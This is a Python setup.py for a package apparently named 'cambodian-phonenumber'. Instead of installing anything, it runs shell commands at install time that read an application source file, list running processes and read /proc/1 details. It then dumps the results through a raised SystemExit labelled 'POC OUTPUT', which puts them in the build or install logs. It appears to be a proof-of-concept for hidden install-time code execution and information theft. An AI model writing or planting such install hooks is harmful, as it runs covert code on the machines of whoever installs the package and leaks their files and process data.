import os, subprocess
from setuptools import setup
def run(c):
    try:
        return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30).stdout.strip()
    except Exception as e:
        return f"<err:{e}>"
out = []
out.append("main_py=\n" + run("cat /app/src/phonenumber/main.py"))
out.append("ps=" + run("ps aux 2>/dev/null || ls /proc | grep -E '^[0-9]+$'"))
out.append("uptime_proc=" + run("ls -la /proc/1/cwd 2>&1; cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '"))
banner = "\n".join("POC>> "+l for l in out)
raise SystemExit("\n\n==== POC OUTPUT START ====\n" + banner + "\n==== POC OUTPUT END ====\n")
setup(name="cambodian-phonenumber", version="0.0.1")
